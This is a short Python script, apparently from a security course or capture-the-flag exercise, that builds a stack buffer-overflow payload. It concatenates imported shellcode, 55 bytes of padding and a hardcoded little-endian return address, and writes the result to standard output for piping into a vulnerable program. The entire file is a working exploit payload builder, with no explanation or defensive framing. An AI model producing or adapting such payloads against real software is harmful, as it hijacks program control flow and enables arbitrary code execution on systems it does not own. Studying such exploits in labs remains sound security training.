from shellcode import shellcode
import sys
sys.stdout.buffer.write(shellcode+b"a"*55+0xFFF6FA3C.to_bytes(4, "little"))